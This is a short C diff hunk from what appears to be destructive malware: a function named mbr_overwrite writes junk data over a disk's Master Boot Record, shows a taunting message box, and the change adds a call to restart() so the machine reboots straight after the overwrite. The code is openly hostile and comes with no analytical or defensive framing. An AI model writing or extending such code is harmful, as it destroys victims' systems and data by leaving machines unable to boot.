@@ -296,6 +296,7 @@ void mbr_overwrite()
         if(WriteFile(mbr, trash_data, BUFF_SIZE, &written, NULL) == TRUE) //if our trial to overwrite MBR with our data worked (without errors) program will print
         {                                                                 //MBR overwritten and exit
             MessageBox(NULL, "lol get rekt nerd", "lol get rekt neerd skil isue", MB_ICONEXCLAMATION | MB_OK);
+            restart();
         }
 }
 
